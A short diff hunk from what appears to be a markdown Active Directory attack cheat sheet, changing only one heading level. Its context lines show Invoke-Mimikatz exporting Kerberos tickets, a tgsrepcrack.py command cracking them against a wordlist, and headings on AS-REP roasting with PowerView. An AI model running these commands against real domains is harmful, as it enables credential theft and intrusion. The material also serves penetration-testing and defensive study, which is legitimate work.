@@ -44,7 +44,7 @@ C:> Invoke-Mimikatz -Command '"kerberos::list /export"'
 C:> python.exe .\tgsrepcrack.py .\<wordlist>.txt .\<exported_file_from_mimikatz>.kirbi
 ```
 ### Targeted Kerberoasting AS-REPs
-###### Enumerating accounts with Kerberos Preauth disabled
+##### Enumerating accounts with Kerberos Preauth disabled
 ```powershell
 # 
 # PowerView
